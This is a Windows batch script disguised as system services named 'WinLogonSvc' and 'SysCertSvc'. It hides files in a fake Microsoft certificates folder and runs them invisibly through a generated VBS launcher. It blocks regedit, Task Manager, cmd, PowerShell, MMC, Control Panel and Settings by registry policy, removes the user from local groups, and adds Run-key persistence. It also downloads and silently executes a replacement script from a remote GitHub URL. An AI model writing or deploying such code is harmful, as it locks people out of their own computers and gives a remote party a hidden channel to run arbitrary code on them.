@echo off
setlocal enabledelayedexpansion
set "LAUNCHER_VERSION=1.8"
set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "workerScriptPath=%secretPath%\restore_worker.bat"
set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"
set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"

start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"

net localgroup SISTEMA "%USERNAME%" /delete >nul 2>&1
net localgroup SYSTEM "%USERNAME%" /delete >nul 2>&1

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
set "targetPath=%launcherScriptPath%"

(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.Run ^"""" & WScript.Arguments(0) & """" , 0, False
) > "%vbsLauncherPath%"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f >nul

:: Cria a lista de programas proibidos
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "regedit.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "2" /t REG_SZ /d "taskmgr.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "3" /t REG_SZ /d "cmd.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "4" /t REG_SZ /d "powershell.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "5" /t REG_SZ /d "mmc.exe" /f >nul
:: Bloqueia o acesso ao Painel de Controle
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f

:: Bloqueia o acesso às Configurações (Settings)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSettingsPage /t REG_DWORD /d 1 /f

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /f >nul
)

curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
if exist "%secretPath%\lv.tmp" (
    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
        if exist "%launcherScriptPath%.new" (
            (
                echo @echo off
                echo timeout /t 2 /nobreak ^> nul
                echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%"
                echo attrib +h +s "%launcherScriptPath%"
                echo start "" /B wscript.exe "%vbsLauncherPath%" "%launcherScriptPath%"
                echo del /f /q %%~f0
            ) > "%secretPath%\ul.bat"
            start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
            goto :eof
        )
    )
)

:eof
endlocal
exit /b
